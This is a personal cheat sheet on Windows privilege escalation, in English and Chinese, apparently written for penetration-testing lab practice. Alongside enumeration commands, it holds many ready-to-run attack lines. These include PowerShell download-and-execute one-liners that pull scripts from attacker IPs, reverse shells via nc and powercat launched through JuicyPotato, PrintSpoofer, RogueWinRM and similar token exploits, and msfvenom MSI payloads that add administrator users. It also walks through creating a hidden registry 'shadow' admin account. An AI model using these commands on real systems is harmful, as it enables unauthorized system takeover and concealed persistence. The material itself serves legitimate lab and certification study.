# Windows Privilege Escalation

**Done** 
+ [windows权限提升](https://cloud.tencent.com/developer/article/1662337)
+ [windows提权看这一篇就够了](https://cloud.tencent.com/developer/article/1771226)
+ [hacktricks-win-pe-checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)


**todo**
+ [infosecsanyam - winpe](https://oscp.infosecsanyam.in/priv-escalation/windows-priv-escalation/privilege-escalation-windows)
+ [offsecnewbie - winpe](https://guide.offsecnewbie.com/privilege-escalation/windows-pe)
+ [Fuzzysecurity-windows privilege escalation fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
+ Token manipulation, hacktricks
+ installed app - db privesc
+ DLL hijack, more than oscp
+ other things from my own practice walkthrough

## Tips
+ old version, check the kernel exploit; notice the architechter.
+ check program folder, third app worth to try.
+ check folder/file with write permission; User's home folder/desktop, webroot, backups folder
+ check the writable service;
+ check the loopback port
+ No shell back? check the architechter(x86/x64) and change the paylaod
+ No shell back? check the firewall and port, use the open port of the target
  
**privesc strategy from Tib3rius Udemy Course**
+ Spend some time and read over the results of your enumeration.
  > If WinPEAS or another tool finds something interesting, make a note of it.Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
+ Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\ and C:\Program Files)
  > Read through interesting files that you find, as they may contain useful information that could help escalate privileges.
+ Try things that don’t have many steps first, e.g. registry exploits, services, etc.
  > Have a good look at admin processes, enumerate their versions and search for exploits.Check for internal ports that you might be able to forward to your attacking machine.
+ If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.
  > This might be a process or file name you aren’t familiar with or even a username.At this stage you can also start to think about Kernel Exploits.



## quick list
```bat
#-user
# current user, login user, logged in uesr, groups
whoami
whoami /all
whoami /priv
echo %username%
# 查看user、localgroups
net user
net localgroup
net user user1
net group /domain <groupname>

#-host
hostname

#-system
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo

#-process
tasklist /SVC
tasklist /svc /fo list # 格式化输出，list； 或table，csv
tasklist /svc /fo list | more
tasklist /svc /fo list /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running"

#-network
ipconfig /all
route print //network routing tables
arp -A
//a, active tcp conn, n address and port num, o owner pid
netstat -ano

#-firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall show currentprofile //list current profile
netsh advfirewall firewall show rule name=all //list fw rules

#-schedule task
# /NH, table/csv 指定不显示列标题
# /V, 显示详细任务输出
# /TN taskname, 检索的task path\name
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
## transfer the log to kali and grep
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

Get-ScheduledTask # powershell

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"

#-installed app and patch
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# readable/writable File and dir
accesschk.exe -uws "Everyone" "c:\Program Files" //-u suppress error, -w write permission, -s recursive search
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

#-unmount disk
mountvol //list all drivers available to mount

#-device drivers and kernel modules
// all loaded drivers
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
// list driver versions
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,
DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

#-Binaries autoelevate
reg query //AlwaysInstallElevated

```
## auto enum
+ [watson](https://github.com/rasta-mouse/Watson)
+ [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) (Winpeas has watson embedded)
+ [SherLock](https://github.com/rasta-mouse/Sherlock), powershell
+ [powerup](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

### winpeas
+ hacktrick checklist,[checklist win privesc](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
+ git,[winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+ exe需.net framework 4.0环境
+ 无.net考虑使用bat
+ 颜色标注重要信息，修改注册表修复

```bat
# 修复颜色显示问题
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

winPEASany.exe cmd > output.txt
less -R output.txt
cat output.txt

wpeas.exe log=c:\test\out.txt

# windows creds search, registry
winpeasany.exe quiet cmd windowscreds

# powershell
IWR -uri http://10.10.14.10:9999/winPEASx64.exe -OutFile winPEASx64.exe
.\winpeasx64.exe

# check the .net version
## go to windows\Microsoft.Net\Framework64
## check the folder name, with version; 
## google and verify 
dir c:\windows\Microsoft.Net\Framework64

```

### Powerup
+ git: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+ usage: https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
+ PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

```powershell
# PowerSploit/powerup
powershell -ep bypass
. .\powerup.ps # Import-Module powerup.ps1
Invoke-AllChecks

# output file
PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt

# one liner
C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

# no file on local disk/no touching disk
C:\> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1mK64oH'); Invoke-AllChecks"

# 常用
Get-UnquotedService         #returns services with unquoted paths that also have a space in the name
Get-ServiceDetail           #returns detailed information about a specified service
Set-ServiceBinaryPath       #sets the binary path for a service to a specified value
Invoke-ServiceAbuse         #modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary         #writes out a patched C# service binary that adds a local admin or executes a custom command

# vulnerable service executeable
# backup exe and write out a patched C# service
# create new user named backdoor, reboot to get user added; can't start/stop service
# restore service
# PS C:\> Write-ServiceEXE -ServiceName CustomSVC -UserName backdoor -Password password123 -Verbose
Restore-ServiceEXE -ServiceName CustomSVC

# 参考：Powrshell 提权框架-Powerup; PowerShell工具之Powerup详解实录
# 远程加载内存中执行
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.128/Powershell/PowerSploit/Privesc/PowerUp.ps1');Invoke-AllChecks"

# 本地加载
# 不想每次都要的加载可以使用 -NOexit 参数
powershell.exe -nop -exec bypass -C "Import-Module .\PowerUp.ps1;Invoke-AllChecks" 
Powershell.exe -exec bypass -Command "&{Import-Module .\PowerUp.ps1;Invoke-AllChecks}" 
```

### PrivescCheck
+ [PrivescCheck](https://github.com/itm4n/PrivescCheck)

```bat
# from cmd prompt
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# From a PowerShell prompt
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1; Invoke-PrivescCheck

# From a PowerShell prompt without modifying the execution policy
PS C:\Temp\> Get-Content .\PrivescCheck.ps1 | Out-String | IEX
PS C:\Temp\> Invoke-PrivescCheck

# Extended mode 
Invoke-PrivescCheck -Extended

# report file
Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME%
Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML
```

### win privesc
+ 比较老，用的不多。
+ find privesc vectors(as Admin)
+ find privesc vectors(as low-priv)
+ python supported
+ [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

```
windows-privesc-check2.exe --dump -G
```


## Hostname
+ hostname provide clues about its functional role, web/db/ftp/dc
```bat
hostnmae
echo %username%
```

## systeminfo
+ OSname, OS type, OS version, architecture info
+ installed patch
+ need precise information about the target
+ mismatched kernel exploit can lead to system instability

### Version info
```bat
# /B, 行的开始进行匹配
# /C, 指定字符串
# /R, 将搜索字符串作为一般表达式
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /R /B /C:"OS Name" /C:"OS Version" /C:"System Type" # 注意语言
systeminfo

# cmd search
systeminfo>systeminfo.txt&(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type systeminfo.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a systeminfo.txt

# 查看本地系统补丁
systeminfo |findstr "KB"
wmic qfe get Caption,Description,HotFixID,InstalledOn
#另外两种远程查询的方式需要结合其他远程执行方式，例如 wmic远程，schtasks远程、dcom远程等等
wmic qfe get Caption,Description,HotFixID,InstalledOn |findstr /C:"KB3143141"

#-msf
use post/windows/gather/enum_patches
set session id #id是已经获得的session号
post/multi/recon/local_exploit_suggester
set session id #id是已经获得的session号
```
### Device drivers & kernel modules
+ need to compile a list of drivers and kernel modules that loaded on the target
+ matching vulnerabilities with corresponding exploits

```powershell
# Powershell env
# /v, verbose
# /fo csv, output format csv
# Select-Object, filter output/select specific object properties
powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path

# 查询指定devicename的driver, version/manufacturer
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### version Exploits
+ trick-python to binary, python不可用时，使用pyinstaller将py exploit转为binary
+ 同linux，建议最后使用该方式，可能对server造成破坏。
+ 查看os name, OS version, System Type
+ 优先考虑三方driver漏洞
+ exploit（c code）编译，优先考虑同平台；mingw-64.bat

**exploit search**
+ more common exploit, https://pentesting.one2bla.me/privesc/windows-privesc/common-exploits
+ SecWiki/windows-kernel-exploits, [git](https://github.com/SecWiki/windows-kernel-exploits/tree/master/). 
+ [nomi-sec poc](https://github.com/nomi-sec/PoC-in-GitHub)
+ [abatch17-win exploits](https://github.com/abatchy17/WindowsExploits)

**exploit search**
+ powershell/winpeas not able to work, this is great. [windows exploit suggester python](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+ wes scan, another python script to find kernel exploit. [wesng](https://github.com/bitsadmin/wesng)
+ post/windows/gather/enum_patches
+ post/multi/recon/local_exploit_suggester, if exploit failed try msf(check htb granny).

```bash
# win exp suggestor python2; result constains msxx-xxx
pip install xlrd
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py -d 2020-05-31-mssb.xls -i systeminfo.txt

## update db
./windows-exploit-suggester.py --update

## systeminfo
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt

## possible exploits for an operating system can be used without hotfix data
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'

# sherlock
Import-Module Sherlock.ps1 #本地

## 远程加载
IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.128/Powershell/Sherlock.ps1') 

Find-AllVulns #脚本提供了单个的Find函数，get-command查看

# wes.py, python3; result contains cve and kb, no msxx-xxx.
## install via pip is recommanded.
pip install wesng
wes sysinfo.txt --hide "Internet Explorer" Edge
```

#### win7-USBPcap
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
System Type: X86-based PC

driverquery /v | findstr "USBPcap"

searchsploit USBPcap
type "c:\program files\USBPcap\USBPcap.inf" //查看版本、信息

gcc xx.c -o exploit.exe

whoami
exploit.exe
whoami
```

#### MS16-032
[lab-bethany],[htb-optimum]

关于32/64 bit shell run 64bit exploit
> https://www.youtube.com/watch?v=kWTnVBIpNsE
> https://spencerdodd.github.io/2017/07/20/WOW64/
> https://0xdf.gitlab.io/2021/03/17/htb-optimum.html

||32 bit folder|64 bit folder|
|:---|:---|:---|
|32 bit session|C:\Windows\system32\|C:\Windows\systemNative\|
|64 bit session|c:\windows\sysWoW64\|C:\Windows\system32\|

```
# check shell
[Environment]::Is64BitProcess

#-from windows-kernel-exploits, add user
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.128/Powershell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user 2 Admin123gT /add'"

# exploit to reverse shell with nishang
# modify Invoke-MS16032, add to bottom
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.196/shell.ps1')"

# modify Invoke-PowerShellTcp.ps1, add to bottom
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.196 -Port 1338

# trigger
c:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.196/Invoke-MS16032.ps1')
```

[Invoke-MS16032.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1)
[Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)

#### win xp
[lab-bob]
参考：https://sohvaxus.github.io/content/winxp-sp1-privesc.html

***accesschk older version***
https://xor.cat/assets/other/Accesschk.zip
https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D

#### cve-2017-0213
+ CVE-2017-0213: Windows COM Elevation of Privilege Vulnerability
+ https://www.exploit-db.com/exploits/42020/
+ This applies to:
  Windows 10 (1511/10586, 1607/14393 & 1703/15063)
  Windows 7 SP1 x86/x64
  Precompiled exploits:
  https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213
  https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
+ exploit, https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213


### WSUS
+ if the updates are not requested using https but http
+ check if the network uses a non-SSL WSUS update
+ tools,  MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.
+ [hacktricks - wsus](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus)
+ [Wsuxploit](https://github.com/pimps/wsuxploit)
+ [pyWSUS](https://github.com/GoSecure/pywsus)
+ [Wsuspicious](https://github.com/GoSecure/WSuspicious), need to build sln.
+ [CTX_WSUSpect_White_Paper.pdf](https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LsGjqDCwhmtzpPg_P_x%2F-LsGjy5eKwmpuYwPQw_Y%2FCTX_WSUSpect_White_Paper.pdf?alt=media&token=7ecf0d61-f9ca-4b30-a1f6-1a77bea9b8a8)


```bat
# check reg
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
## result like this, exploitable.
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535

# or check, if equals 1, eaploitable.
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWuServer
```

## R/W file&dir
+ scripts and binary file executed under the context of admin/root; overwrite it with milicious file to elevate privilege
+ sensitive file may contains important information, hardcoded credentials for db or service account
+ icacls, check permission
+ accesschk, from SysInternals; the most well-known and often used tool for permission check.
+ [accesschk tool](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
+ [well-known-sids](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids)

```bat
# enumerate the Program Files directory in search of any file or directory that allows the Everyone group write permissions.
# -u, suppress erros
# -w, search write permission
# -s, recursive search
accesschk.exe -uws "Everyone" "c:\Program Files"

# icacls 
## 
icacls dir

# Powershell
# Get-ACL, retrieve all permission for a given file or dir; can not run recursively
# Get-ChildItem, enum everything unser the given dir
# AccessToString -match, match specific access properties
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

## AutoInstallElevate
+ interesting OS specific "shortcuts" to privilege escalation
+ AlwaysInstallElevated in `HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE`
  > any user can run windows installer packages with elevated privileges

+ 参考 [windows权限提升](https://cloud.tencent.com/developer/article/1662337)


**AlwaysInstallElevated**是一个组策略设置，该设置允许普通用户以System权限安装Windows Installer 程序包（MSI）。windows系统组件之一，用于管理和配置软件服务；用户点击msi软件包，系统自动调用msiexec.exe

默认未配置，可通过组策略启用：
1. Computer Configuration\Administrative Templates\Windows Components\Windows Installer
2. User Configuration\Administrative Templates\Windows Components\Windows Installer

> 本地组策略配置后之后不是立即生效的，计算机配置有一个刷新间隔时间（组策略可配置)，gpupdate /force可强制更新策略。
> 或者重启登录。对于计算机配置需要重启系统生效，对于用户配置需要用户注销登录生效
> 注：Computer Configuration和User Configuration需要都启用，否则无效

```bat
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v
reg query HKEY_CURRENT_USER/Software/Policies/Microsoft/Windows/Installer /v
AlwaysInstallElevated REG_DWORD 0x1

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v 
AlwaysInstallElevated REG_DWORD 0x1 

#添加注册表
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f

#刷新、查询是否开启AlwaysInstallElevated
#开启后注册表键值为1
gpupdate /force
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### MSI exploit

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted

#使用msfvenom生成msi包
msfvenom -p windows/exec CMD="cmd.exe /c net user john Password123! /add && net localgroup Administrators john /add" -f msi -o UserAdd.msi

#/qn 安装过程中没有用户界面
#/i 正常安装#/quiet 静默安装
msiexec.exe /quiet /qn /i UserAdd.msi
#-msexec.exe 远程加载
msiexec /q /i http://192.168.119.196/UserAdd.msi

# msf exploit
exploit/windows/local/always_install_elevated
```

### Powerup

```powershell
Write-UserAddMSI

#检查是否设置了AlwaysInstallElevated 注册表项
Get-RegistryAlwaysInstallElevated

#写MSI安装程序，提示要添加的用户
Write-UserAddMSI
```

## Users&Groups

+ identify the user context
+ current user, is admin?
+ user list, identify potential high-privilege user accout
+ check token enble
> SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, eCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege

### Enum

```bat
# 查看user
whoami
whoami /all
whoami /priv
echo %username%

net user # 当前用户
net users # 所有用户
net user user1

# localgroups
net localgroup
net group /domain
net group /domain <groupname>

# powershell
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Token Manipulation
+ [about windows token](https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#access-tokens)
+ [Privilege escalation abuse token - hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
+ 常见，**seImpersonatePrivilege(3.1.1)/SeAssignPrimaryPrivilege (3.1.2)**

#### impersonate
+ Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. 
+ You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM. 
+ Exploit it with juicy-potato, RogueWinRM (needs winrm disabled), SweetPotato, PrintSpoofer.
+ usually local service account or network service account with “SeImpersonatePrivilege” or SeAssignPrimaryTokenPrivilege” enabled
+ practice machine: pg-jacko,
+ for windows 2003, try churrasco first(htb-granny/grandpa); [Churrasco](https://github.com/Re4son/Churrasco/)

**PrintSpoofer**
+ From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.
+ [git repo](https://github.com/itm4n/PrintSpoofer)

```bat
## printspoofer, pg-jacko
# https://github.com/itm4n/PrintSpoofer

# Run PowerShell as SYSTEM in the current console
PrintSpoofer.exe -i -c powershell.exe

# Spawn a SYSTEM command prompt on the desktop of the session 1
PrintSpoofer.exe -d 1 -c cmd.exe

# Get a SYSTEM reverse shell
PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
```


#### Potatos
+ juicy-potato, RogueWinRM, RoguePotato, SweetPotato
+ machine >= window10 1809 & Windows Server 2019, try Rogue Potato
+ machine < window 10 1809 < Winodws Server 2019, try juicy Potato
+ if WinRM service not running, try Rogue-WinRM, default on windows 10 but not on windows server 2019
+ Juicy potato git repo, [juicy potato](https://github.com/ohpe/juicy-potato), [hacktricks-JuicyPotato](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato)
+ Rogue WinRM git repo, [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)
+ Rogue Potato repo, [RoguePotato](https://github.com/antonioCoco/RoguePotato)
+ Sweet potato repo, need to build. [SweetPotato](https://github.com/CCob/SweetPotato)

**Rogue WinRM**

```bat
# Mandatory args:
-p <program>: program to launch

# Optional args:
-a <argument>: command line argument to pass to program (default NULL)
-l <port>: listening port (default 5985 WinRM)
-d : Enable Debugging output

# running an interactive cmd
RogueWinRM.exe -p C:\windows\system32\cmd.exe

# running netcat reverse shell
RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "10.0.0.1 3001 -e cmd"
```

**Rogue Potato**

```bat
# set up a network redirector/port forwarder on kali(must 135 as source port) and redirecting back to Remote on any tcp port
## forwarding kali port 135 to port 9999 on windows
sudo socat tcp-listen:135,reuseaddr,fork tcp:targetip:9999

# start listen on kali
nc -nvlp 4444

# exploit on target, reverse.exe connect 4444
## -r, remote ip/kali ip
## -l, listening port
## -e, reverse shell executable path
RoguePotato.exe -r kaliip -e "C:\PrivEsc\reverse.exe" -l 9999
```

**Juicy Potato**
+ SeImpersonate权限, `-t t`
+ SeAssignPrimaryToken权限, `-t u`
+ 均开启，`-t *`
+ 均未开启，无法提权
+ RPC端口是否135， 非135时 `-n portnum`
+ 选择系统未占用的端口作为监听端口，`-l`

```bat
# 添加防火墙规则，允许135端口入站
netsh advfirewall firewall add rule name=“135” protocol=TCP dir=in localport=135 action=allow

# paras 
T:\>JuicyPotato.exe
JuicyPotato v0.1
## Mandatory args:
## -t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
## -p <program>: program to launch
## -l <port>: COM server listen port

## Optional args:
## -m <ip>: COM server listen address (default 127.0.0.1)
## -a <argument>: command line argument to pass to program (default NULL)
## -k <ip>: RPC server ip address (default 127.0.0.1)
## -n <port>: RPC server listen port (default 135)
## -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
## -z only test CLSID and print token's user

# 利用
whoami /all
whoami /priv

nc -nvlp 4445

## common use 
juicypotato.exe -t * -p c:\temp\1337.exe -l 9001

## powershell down powcat and get shell
jp86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://192.168.119.196/powercat.ps1');powercat -c 192.168.119.196 -p 4445 -e cmd" -t *

## windows 2012 6.3.9600 N/A Build 9600
JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://192.168.119.196/powercat.ps1');powercat -c 192.168.119.196 -p 4444 -e cmd" -t *

## -p,use bat
echo cmd /c c:\windows\tasks\445.exe > run.bat
juicypotato.exe -t * -p run.bat -l 9002 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 

## if error, COM -> recv failed with error: 10038
## change clsid

# 获取CLID
## getclid, https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
## test, https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
foreach($a in $CLSID)
{
Write-Host $a.CLSID
}

powershell -ep bypass -f getclid.ps1
PowerShell.exe -ExecutionPolicy Bypass -File getclid.ps1 > CLSID.list
```

#### SeManageVolumePrivilege
+ SeManageVolumePrivilege, pg-access
+ [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)
+ [reference](https://twitter.com/0gtweet/status/1303432729854439425)
+ [WerTrigger](https://github.com/sailay1996/WerTrigger)

```bat
# execute SemanageVolumeExploit.exe, Bbuiltin Users group has full permission on the windows folder.
C:\xampp\htdocs\uploads>whoami
access\svc_mssql

C:\xampp\htdocs\uploads>SeManageVolumeExploit.exe
Entries changed: 865
DONE 

C:\xampp\htdocs\uploads>icacls C:/Windows
C:/Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)

# 1. Copy **phoneinfo.dll** to **C:\Windows\System32**
# 2. Place **Report.wer** file and **WerTrigger.exe** in a same directory.
# 3. Run **WerTrigger.exe**.
wertrigger.exe
## input you command
c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe

```

#### local servie to System
+ local service/net service account have the defualt privilege, including **SeAssignPrimaryToken, SeImpersonate**
+ use fullpowers to recovering the default privilege, [fullpowers git](https://github.com/itm4n/FullPowers)
+ or create schduled task to get default privilge
+ exploit **SeAssignPrimaryToken, SeImpersonate**

```bat
whoami 
nt authority\local service

# create scheduled task to get default privilege
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
## or 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command c:\shell.exe"

## register task
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"

## start task
Start-ScheduledTask -TaskName "GrantPerm"

# fullpowers
fullpowers.exe
FullPowers -c "powershell -ep Bypass"
FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```

### Logon Users/Sessions

```bat
# 当前会话
qwinsta

# 当前sessions
klist sessions
```

### Home Folders

```bat
dir c:\users
Get-ChildItem C:\users
```

### Password Policy

```bat
net account
```

### Clipboard

```powershell
powershell -command "Get-Clipboard"
```

### 影子用户

> 计算机管理>本地用户和组> 无法查看影子用户
> net user 看不到
> net localgroups 可查看，注册表可查看

+ 创建有用户test1$
+ 修改注册表，管理员完全控制hklm/sam/sam
+ 修改注册表
> domains\account\users, 替换0x3eb(test1$) F 值为管理员的值，管理员0x1f4(16进制代码，十进制500，即UID）
+ 导出注册表
> domains\account\users\000003eb
> domains\account\users\names\test1$
+ 删除test1$ 用户
+ 导入用户test1$

```bat
# 影子用户, 通过注册表创建
net user test1$ 123456
regedit # 修改reg权限，管理员完全控制 hklm/sam/sam/

# hklm/sam/sam/domains/account/users/names
# 修改F 值为管理员，导出users中F 、names中 test1$ reg
# 删除用户，reg 导入
net user test1$ /del
net user test1$ # 查看
net user test1$ /active:yes # 启用

# net user 查看无test1，实际reg中存在
```




## Running Process
+ process running with privileged account,need high privilege
+ have insecure permissions
+ allow to interact with it in unintended ways
+ passwords inside the command line of process
+ check if you can overwrite some binary running or have write permissions of the binary folder to exploit [DLL-Hijacking attact](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking)

#### Enum 

```bat
# /svc, return processes that mapped to a specific win service
# /fo, format; list/table/csv
# /NH, table/csv 指定不显示列标题
# /V, 显示详细任务输出
# /TN taskname, 检索的task path\name
tasklist /SVC | more
tasklist /svc /fo list # 格式化输出，list； 或table，csv

tasklist /svc /fo list  "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"

# list 进程核心信息
wmic process list brief 

# Powershell
# With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

# Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

#### file/dir permissions

```bat
# W, write; F, full control
icacls C:\xxx\xx.exe
icacls c:\xx

# check permission of processes binary
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)

# check permissions of the folders of the binaries
